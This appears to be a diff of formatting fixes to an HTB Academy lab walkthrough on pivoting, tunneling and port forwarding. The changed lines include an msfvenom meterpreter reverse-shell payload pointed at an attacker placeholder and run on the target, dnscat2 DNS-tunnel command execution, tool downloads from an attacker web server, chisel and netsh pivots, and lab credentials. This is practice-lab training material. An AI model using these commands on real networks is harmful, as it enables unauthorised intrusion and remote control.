@@ -80,8 +80,8 @@ and then we will be requested to enter the password.
 For windows – we will use xfreerdp with the command:
 ```bash
 xfreerdp /v:<Target IP> /u:<username> /p:<password>
-```
 /dynamic-resolution
+```
 to RDP connect to the machine.
 Throughout the module, those steps will be referred as 'login to the
 Linux/Windows target machine' (unless specified otherwire – those are the
@@ -164,8 +164,8 @@ tail -4 /etc/proxychains.conf
 
 ```bash
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
-```
 /dynamic-resolution
+```
 
 
 And then..
@@ -269,7 +269,7 @@ Lets set the pivot required for the ping sweep,
 We will generate on the pwnbox the required payload to arrange pivoting on
 the target machine to the listening pwnbox, on port 8080:
 msfvenom -p linux/x64/meterpreter/reverse_tcp
-LHOST=<attacker-IP> -f elf -o backupjob LPORT=8080
+LHOST=`<attacker-IP>` -f elf -o backupjob LPORT=8080
 
 
 The payload was generated to the output ELF file 'backupjob'.
@@ -308,8 +308,8 @@ payload:
 ls;
 ```bash
 chmod u+x backupjob;
-```
 ./backupjob;
+```
 
 
 
@@ -431,8 +431,8 @@ Skipped
 
 ```bash
 SSH Pivoting with Sshuttle:
-```
 Question - Optional: Try using sshuttle from Pwnbox to connect via RDP to the
+```
 Windows target (172.16.5.19) with "victor:pass@123" on the internal network.
 Once completed type: "I tried sshuttle" as the answer.
 Answer: I tried sshuttle
@@ -471,9 +471,8 @@ Enter yes here.
 Now we should have access to 172.16.5.19.
 Now, ping will NOT work with sshuttle, so we will directly get to the RDP part:
 ```bash
-xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /dynamic-
+xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /dynamic-resolution
 ```
-resolution
 enter y for the certificate approval:
 
 ![Figure 14.1 — Lab execution and output verification (Page 14)](/assets/images/posts/htb-academy/pivoting-tunneling-and-port-forwarding/p014_01.jpg)
@@ -537,7 +536,7 @@ provided credentials: 'htb-student:HTB_@cademy_stdnt!'.
 In the machine, open cmd as administrator, and run the netsh (which is
 preinstalled on the windows target machine), using the command:
 netsh.exe interface portproxy add v4tov4 listenport=8080
-listenaddress=<target-IP> connectport=3389
+listenaddress=`<target-IP>` connectport=3389
 connectaddress=172.16.5.19
 
 then we can confirm the port forwarding using the command:
@@ -547,12 +546,11 @@ netsh.exe interface portproxy show v4tov4
 There is port forwarding.
 
 Back on the pwnbox, lets xfreerdp to the 172.16.5.19 – via RDP login to
-<target-IP>:8080 (as established in the port forwarding), using the provided
+`<target-IP>`:8080 (as established in the port forwarding), using the provided
 credentials: 'victor:pass@123':
 ```bash
-xfreerdp /v:<target-IP>:8080 /u:victor /p:pass@123 /dynamic-
+xfreerdp /v:<target-IP>:8080 /u:victor /p:pass@123 /dynamic-resolution
 ```
-resolution
 
 ![Figure 16.1 — Lab execution and output verification (Page 16)](/assets/images/posts/htb-academy/pivoting-tunneling-and-port-forwarding/p016_01.jpg)
 *_Figure 16.1 — Lab execution and output verification (Page 16)_*
@@ -597,9 +595,8 @@ sudo bundle install
 
 then start the server with the command:
 ```bash
-sudo ruby dnscat2.rb --dns host=<attacker-
+sudo ruby dnscat2.rb --dns host=<attacker-IP>,port=53,domain=inlanefreight.local --no-cache
 ```
-IP>,port=53,domain=inlanefreight.local --no-cache
 
 ![Figure 18.1 — Lab execution and output verification (Page 18)](/assets/images/posts/htb-academy/pivoting-tunneling-and-port-forwarding/p018_01.png)
 *_Figure 18.1 — Lab execution and output verification (Page 18)_*
@@ -621,8 +618,8 @@ Import-Module .\dnscat2.ps1
 ```
 
 Start-Dnscat2 -DNSserver 10.10.14.80 -Domain
-inlanefreight.local -PreSharedSecret <secret> -Exec cmd
-Where <secret> is the same secret value given in the server initialization (it
+inlanefreight.local -PreSharedSecret `<secret>` -Exec cmd
+Where `<secret>` is the same secret value given in the server initialization (it
 changes for every server initialization):
 
 
@@ -704,7 +701,7 @@ client on the pwnbox:
 ```bash
 chmod u+x chisel
 ```
-./chisel client -v <target-IP>:1234 socks
+./chisel client -v `<target-IP>`:1234 socks
 
 
 
@@ -732,8 +729,8 @@ Now lets use proxychains to RDP login to the windows machine '172.16.5.19'
 within the internal network:
 ```bash
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
-```
 /dynamic-resolution
+```
 * enter yes for the certificate approval. *
 
 However we seek the flag in the Documents folder, not the Desktop:
@@ -796,8 +793,8 @@ python -m http.server 8080
 and download the file on the htb-student/Documents on the target machine 1:
 ```bash
 iwr -uri http://<attacker-IP>:8080/SocksOverRDP-x64.zip -
-```
 outfile SocksOverRDP-x64.zip
+```
 
 Now, before we proceed, we need to make some modifications to the target
 machine security settings.
@@ -951,8 +948,8 @@ Lets open powershell on victor's Documents folder, and download the
 executable:
 ```bash
 iwr -uri http://172.16.5.150:8000/SocksOverRDP-Server.exe -
-```
 outfile SocksOverRDP-Server.exe
+```
 
 *do notice the port here is 800, the default port for server.exe. *
 When downloaded – we run the SocksOverRDP-Server.exe:
@@ -1202,8 +1199,8 @@ found in the 'for-admin-eyes-only' file – 'mlefay:Plain Human work!'
 
 ```bash
 xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
-```
 /dynamic-resolution
+```
 
 
 We are in!
@@ -1405,8 +1402,8 @@ from the pwnbox to 172.16.6.25).
 We will use the command:
 ```bash
 xfreerdp /v:172.16.5.35:8080 /u:vfrank /p:'Imply wet
-```
 Unmasked!' /dynamic-resolution
+```
 
 ![Figure 46.1 — Lab execution and output verification (Page 46)](/assets/images/posts/htb-academy/pivoting-tunneling-and-port-forwarding/p046_01.jpg)
 *_Figure 46.1 — Lab execution and output verification (Page 46)_*
